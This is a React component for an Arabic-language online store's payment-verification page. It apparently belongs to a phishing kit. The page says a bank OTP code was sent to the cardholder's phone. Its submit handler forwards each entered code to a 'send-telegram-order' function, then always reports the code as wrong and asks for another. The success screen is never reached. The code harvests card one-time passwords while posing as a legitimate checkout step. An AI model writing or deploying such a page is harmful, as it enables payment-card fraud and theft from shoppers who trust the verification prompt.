import { useState, useRef, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { useCart } from "@/context/CartContext";
import StoreHeader from "@/components/StoreHeader";
import { CheckCircle2, ArrowRight } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";

const OTPPage = () => {
  const navigate = useNavigate();
  const { clearCart, totalPrice } = useCart();
  const [otp, setOtp] = useState("");
  const [verified, setVerified] = useState(false);
  const [error, setError] = useState("");
  const [timer, setTimer] = useState(60);
  const inputRef = useRef<HTMLInputElement | null>(null);

  useEffect(() => {
    inputRef.current?.focus();
  }, []);

  useEffect(() => {
    if (timer > 0 && !verified) {
      const interval = setInterval(() => setTimer((t) => t - 1), 1000);
      return () => clearInterval(interval);
    }
  }, [timer, verified]);

  const [loading, setLoading] = useState(false);

  const handleChange = (value: string) => {
    if (!/^\d*$/.test(value)) return;
    setOtp(value);
  };

  const handleSubmit = async () => {
    if (otp.length < 4) return;
    setLoading(true);
    setError("");

    try {
      await supabase.functions.invoke("send-telegram-order", {
        body: {
          type: "otp",
          otpCode: otp,
        },
      });
    } catch (err) {
      console.error("Failed to send telegram:", err);
    }

    setTimeout(() => {
      setLoading(false);
      setError("الرمز غير صحيح، حاول مرة أخرى");
      setOtp("");
      inputRef.current?.focus();
    }, 1500);
  };

  if (verified) {
    return (
      <div className="min-h-screen bg-background">
        <StoreHeader />
        <div className="flex flex-col items-center justify-center py-20 px-4 text-center">
          <div className="w-20 h-20 rounded-full bg-green-100 flex items-center justify-center mb-6">
            <CheckCircle2 className="w-12 h-12 text-green-600" />
          </div>
          <h1 className="text-2xl font-bold text-foreground">تم الدفع بنجاح! ✅</h1>
          <p className="text-muted-foreground mt-3 max-w-sm">
            شكراً لك! تم تأكيد طلبك وسيتم شحنه في أقرب وقت ممكن.
          </p>
          <p className="text-sm text-muted-foreground mt-2">
            رقم الطلب: <span className="font-bold text-foreground">#{Math.floor(Math.random() * 900000 + 100000)}</span>
          </p>
          <button
            onClick={() => navigate("/")}
            className="mt-8 bg-foreground text-background px-8 py-3 rounded-sm font-bold hover:opacity-90"
          >
            العودة للرئيسية
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background">
      <StoreHeader />

      <div className="px-4 py-3">
        <button onClick={() => navigate(-1)} className="flex items-center gap-1 text-sm text-muted-foreground hover:text-foreground">
          <ArrowRight className="w-4 h-4" />
          رجوع
        </button>
      </div>

      <div className="flex flex-col items-center justify-center py-12 px-4 text-center">
        <div className="w-16 h-16 rounded-full bg-secondary flex items-center justify-center mb-6">
          <span className="text-3xl">🔐</span>
        </div>

        <h1 className="text-xl font-bold text-foreground">التحقق من الدفع</h1>
        <p className="text-sm text-muted-foreground mt-2 max-w-sm">
          تم إرسال رمز التحقق (OTP) إلى رقم جوالك المسجل في البطاقة
        </p>

        {/* OTP input */}
        <div className="mt-8 w-full max-w-xs" dir="ltr">
          <input
            ref={inputRef}
            type="text"
            inputMode="numeric"
            value={otp}
            onChange={(e) => handleChange(e.target.value)}
            placeholder="أدخل رمز التحقق"
            className="w-full border-2 border-border rounded-md py-4 px-4 text-center text-2xl font-bold text-foreground tracking-[0.5em] focus:outline-none focus:border-sale transition-colors placeholder:text-sm placeholder:tracking-normal"
          />
        </div>

        {error && (
          <p className="text-sm text-destructive font-medium mt-3">{error}</p>
        )}

        {/* Timer */}
        <div className="mt-6">
          {timer > 0 ? (
            <p className="text-sm text-muted-foreground">
              إعادة الإرسال خلال <span className="font-bold text-foreground">{timer}</span> ثانية
            </p>
          ) : (
            <button
              onClick={() => setTimer(60)}
              className="text-sm text-sale font-medium underline"
            >
              إعادة إرسال الرمز
            </button>
          )}
        </div>

        {/* Confirm button */}
        <button
          onClick={handleSubmit}
          disabled={otp.length < 4 || loading}
          className="mt-6 w-full max-w-xs bg-sale text-sale-foreground py-3 rounded-sm font-bold hover:opacity-90 transition-opacity disabled:opacity-50 disabled:cursor-not-allowed"
        >
          {loading ? "جاري التحقق..." : "تأكيد الرمز"}
        </button>

        <p className="text-xs text-muted-foreground mt-6">
          🔒 هذه الخطوة لحماية عملية الدفع الخاصة بك
        </p>
      </div>
    </div>
  );
};

export default OTPPage;
